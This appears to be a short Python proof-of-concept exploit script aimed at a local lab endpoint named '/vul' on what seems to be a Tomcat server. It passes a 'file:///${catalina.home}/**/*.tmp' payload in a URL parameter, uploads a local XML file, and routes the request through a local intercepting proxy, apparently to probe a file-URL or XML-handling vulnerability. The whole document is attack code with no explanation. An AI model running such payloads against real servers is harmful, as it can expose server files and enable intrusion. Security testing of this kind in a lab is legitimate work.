import requests
from urllib import parse


payload = "file:///${catalina.home}/**/*.tmp"

url = f"http://127.0.0.1:8081/vul?url={payload}"
print(url)


file = {"file": open("1.xml", "rb")}

proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

response = requests.post(url, files=file, proxies=proxy)